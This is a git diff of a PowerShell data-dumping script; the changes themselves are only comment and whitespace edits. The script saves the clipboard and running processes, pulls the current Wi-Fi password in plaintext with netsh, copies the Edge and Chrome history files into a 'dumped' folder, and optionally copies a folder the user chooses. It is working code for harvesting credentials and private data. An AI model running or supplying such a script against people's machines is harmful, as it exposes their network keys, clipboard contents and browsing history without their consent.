@@ -1,4 +1,4 @@
-mkdir dumped -Force #all the dumped data is stored in here.
+mkdir dumped -Force #All the dumped data is stored in here.
 mkdir dumped/edge -Force #All the MS edge data is stored here.
 mkdir dumped/chrome -Force #All Google Chrome data is stored here.
 mkdir dumped/wantedfolder -Force #Desired Path contents are stored here.
@@ -13,19 +13,20 @@ tasklist > dumped/tasklist.txt
 Get-Clipboard > dumped/clipboard.txt
 
 #This gets network information by checking the network name and getting the info based on that.
-$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name
+$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name 
 Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
 
 try {
     #This command copies edge history data to dumped/edge
     $origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
     $edgehistorycopypath="dumped\edge"
-    Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction Stop
+    Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction Stop 
 }
 catch {
     Write-Host "Edge Is not installed on this device, or the history folder is not available."
 }
 
+#The reason we make the error action stop for the history data retreivers is so try catch can catch them and write a message.
 
 try {
     #This command copies chrome history data to dumped/chrome.
@@ -38,7 +39,7 @@ catch {
 }
 
 Write-Host "Do you want to copy a folder? (y/n):"
-$copy_permission = Read-Host
+$copy_permission = Read-Host #This variable asks for input of the user which could be y or n. This is used in the coming if-statement
 
 if ($copy_permission -eq "y") {
     #Asks user for desired path to copy and then copies it and its contents.
